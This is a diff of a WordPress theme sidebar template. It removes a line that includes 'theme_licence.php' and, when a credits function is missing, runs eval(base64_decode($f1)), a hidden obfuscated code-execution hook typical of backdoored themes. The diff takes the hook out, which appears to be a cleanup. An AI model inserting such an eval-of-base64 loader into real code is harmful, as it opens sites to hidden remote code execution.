@@ -1,7 +1,7 @@
 <!-- begin sidebar -->
 
 <ul>
-<?php require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } if ( function_exists('dynamic_sidebar') && dynamic_sidebar() ) : else : ?>
+<?php if ( function_exists('dynamic_sidebar') && dynamic_sidebar() ) : else : ?>
 
 <li><h2>Recent Posts</h2>
 <ul><?php wp_get_archives('type=postbypost&limit=10'); ?></ul></li>
